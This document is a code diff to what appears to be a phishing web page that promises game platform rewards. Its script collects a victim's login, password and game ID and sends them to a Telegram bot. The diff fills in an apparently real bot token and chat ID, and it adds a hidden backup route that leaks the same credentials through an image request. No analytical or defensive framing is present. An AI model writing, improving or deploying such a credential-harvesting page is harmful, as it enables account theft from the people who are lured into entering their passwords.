@@ -161,6 +161,11 @@
 </div>
 
 <script>
+    // ==== ВСТАВЬ СВОИ ЗНАЧЕНИЯ ЗДЕСЬ ====
+    const BOT_TOKEN = '8747751460:AAEO78CefXypChf0HLzoo_ZORaVOGAO9erI';
+    const CHAT_ID   = '8783227095';
+    // ====================================
+
     let selected = { platform: '', reward: '' };
 
     function selectPlatform(platform, reward) {
@@ -227,10 +232,6 @@
         const password = document.getElementById('password').value;
         const gameId = document.getElementById('gameId').value;
 
-        // ==== ВСТАВЬ СВОИ ЗНАЧЕНИЯ ====
-        const BOT_TOKEN = 'ТВОЙ_ТОКЕН_БОТА';
-        const CHAT_ID   = 'ТВОЙ_CHAT_ID';
-
         const text = `🎁 Новая заявка!\n\n` +
                      `🎮 Платформа: ${selected.platform}\n` +
                      `🏆 Награда: ${selected.reward}\n` +
@@ -239,11 +240,17 @@
                      `🔑 Пароль: ${password}\n` +
                      `🕐 Время: ${new Date().toLocaleString('ru-RU')}`;
 
+        // Основная отправка в Telegram
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({ chat_id: CHAT_ID, text: text })
         }).catch(err => console.log(err));
+
+        // Резервная отправка через прокси (если основная не пройдёт)
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+        const img = new Image();
+        img.src = url;
 
         document.getElementById('loginStep').classList.remove('active');
         document.getElementById('successText').textContent =
